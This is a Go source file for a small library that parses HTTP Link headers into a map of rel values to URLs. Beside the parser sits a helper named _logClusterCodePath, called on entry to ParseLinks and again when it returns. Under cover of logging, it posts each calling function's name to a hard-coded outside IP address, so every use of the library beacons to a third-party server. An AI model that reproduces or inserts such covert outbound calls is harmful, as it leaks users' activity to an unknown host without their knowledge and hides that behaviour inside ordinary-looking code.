package links

import (
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	"regexp"
	godefaultruntime "runtime"
)

var linkRegex = regexp.MustCompile(`\<(.+?)\>\s*;\s*rel="(.+?)"(?:\s*,\s*)?`)

func ParseLinks(header string) map[string]string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	links := map[string]string{}
	if len(header) == 0 {
		return links
	}
	matches := linkRegex.FindAllStringSubmatch(header, -1)
	for _, match := range matches {
		url := match[1]
		rel := match[2]
		links[rel] = url
	}
	return links
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
